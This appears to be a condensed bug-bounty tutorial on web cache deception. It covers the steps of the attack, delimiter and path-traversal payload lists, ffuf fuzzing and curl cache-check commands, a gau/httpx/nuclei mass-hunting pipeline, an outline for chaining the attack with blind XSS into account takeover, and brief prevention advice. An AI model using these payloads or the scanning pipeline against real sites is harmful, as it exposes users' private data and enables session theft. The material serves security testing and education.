# : Mastering Web Cache Deception — From Exploit to Account Takeover
- Source: (Aug 11, 2025) — infosecwriteups.com
- High-paying vulnerability: trick caches into storing sensitive content

## What is Web Cache Deception (WCD)?
Manipulate caching systems (CDN, reverse proxy, browser cache) into storing sensitive content under what looks like a static resource. When another user requests that resource, the cache serves the sensitive data.

## How WCD Works
1. Normal request to sensitive endpoint: `/account/settings` — not cached
2. Attacker adds static extension: `/account/settings;.js` or `/account/settings.css`
3. Cache sees `.js`/`.css` extension and caches the response
4. Attacker (unauthenticated) requests the cached URL — gets victim's sensitive data

## Detection Checklist
### Delimiter Testing
Common delimiters that break cache vs. origin interpretation:
```bash
# Semicolon
/account/settings;.js
/account/settings;.css
/account/settings;.ttf

# Path traversal
/account/settings/..%2fprofile
/wcd/..%2f..%2faccount/settings

# Query parameter append
/account/settings?cachebuster=123&.js
/account/settings?.js
```

### Extension Fuzzing
```bash
# Test all static extensions
ffuf -w extensions.txt -u https://target.com/account/settingsFUZZ -mc 200
# extensions.txt: .js .css .png .jpg .gif .svg .ttf .woff .pdf .html .txt .xml .json
```

## Cache Detection Commands
```bash
# Check cache headers
curl -sI "https://target.com/account/settings;.js" | grep -i "x-cache\|cf-cache\|age\|server-timing"

# 2-request validation
curl -sD - "https://target.com/account/settings;.js" -o /dev/null
# Wait 2 seconds, then request again without cookies
curl -sD - "https://target.com/account/settings;.js" -o /dev/null
# If second response has shorter age or HIT, cache is working
```

## Mass Hunting Automation
```bash
# Gather URLs, filter for sensitive paths
gau target.com | grep -E "(account|profile|dashboard|admin|settings|billing)" | \
  sed 's/$/;.js/' | httpx -silent -mc 200 -fr | nuclei -dast
```

## Chaining WCD with XSS → ATO
1. Find XSS on profile fields (name, bio, etc.)
2. Inject blind XSS payload into profile
3. Victim visits profile, XSS fires, captures session
4. Account takeover achieved

## Payload Delimiters List
```
;.js
;.css
;.png
;.jpg
;.svg
;.ttf
;.woff
/..%2fprofile
/..%2f..%2faccount
?.js
?#.js
/;js
/%2e.js
%3B.js
```

## Prevention
- Cache headers: `Cache-Control: no-cache, no-store, must-revalidate`
- Never cache responses with auth cookies
- CDN Cache Deception Armor (Cloudflare)
- Validate Content-Type matches extension before caching
